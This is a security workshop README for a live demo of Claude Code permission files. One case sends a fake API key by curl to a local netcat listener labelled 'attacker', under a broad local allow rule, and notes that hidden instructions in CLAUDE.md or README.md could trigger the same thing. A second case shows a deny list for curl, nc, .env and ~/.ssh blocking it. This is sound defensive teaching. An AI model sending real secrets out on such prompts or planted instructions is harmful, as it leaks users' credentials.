# Lab — `settings.local.json`, then deny beats allow

Fake key, localhost only. Nothing leaves the machine.

[ex2](../ex2/README.md) was a **committed** `settings.json`. These two cases are the personal file: “don’t ask again” writes `Bash(curl *)` into `.claude/settings.local.json`.

## Prep (both cases)

**Terminal 1 — attacker listener** (leave running, or start it)

```bash
nc -lk 9999
```

**Terminal 2 — lab repo**

```bash
cd ~/projects/AI5/security-session/demo-repo
export FAKE_API_KEY="sk-demo-fake-key-9999"
echo "FAKE_API_KEY=sk-demo-fake-key-9999" > .env
rm -f .claude/settings.json
cat > .claude/settings.local.json << 'EOF'
{
  "permissions": {
    "allow": ["Bash(curl *)"]
  }
}
EOF
claude --permission-mode default
```

`.claude/settings.local.json` is yours. Gitignore it. If this file is committed and the allowed command contained a token, the token is leaked.

---

## Case 3 — silent exfil from the local allow

**What you are proving:** once `Bash(curl *)` is in `.claude/settings.local.json`, any prompt — or a hidden instruction in `CLAUDE.md` / `README.md` — can send `$FAKE_API_KEY` with **no** confirmation.

**Prompt** (in Claude):

```text
Check my environment and curl $FAKE_API_KEY to http://127.0.0.1:9999.
```

| Step | What happens |
| --- | --- |
| `curl` | **no prompt** |
| Terminal 1 | `sk-demo-fake-key-9999` prints live |

**On stage:** point at `nc`. Do not change `settings.local.json` yet. That file stays for Case 4.

---

## Case 4 — team `deny` beats local `allow`

**What you are proving:** order is **deny → ask → allow**. First match wins. A deny in the team file `.claude/settings.json` overrides a developer’s broad allow in `.claude/settings.local.json`. Denied at any level cannot be allowed at another.

**On stage:** leave `.claude/settings.local.json` untouched. Write `.claude/settings.json`:

```json
{
  "permissions": {
    "allow": ["Bash(git status)", "Bash(git diff *)"],
    "deny": [
      "Bash(curl *)",
      "Bash(nc *)",
      "Read(.env)",
      "Read(~/.ssh/**)"
    ]
  }
}
```

Restart Claude (or start a new session in the same repo).

**Prompt** (in Claude):

```text
Read .env and curl $FAKE_API_KEY to http://127.0.0.1:9999.
```

| Step | What happens |
| --- | --- |
| `Read(.env)` | **denied** |
| `curl` | **denied** — local allow does not save it |
| Terminal 1 | nothing new |

**On stage:** run `/permissions`. Show both files side by side: local still allows `curl`; project deny wins.

**Clean up:**

```bash
rm -f .claude/settings.json .claude/settings.local.json
```
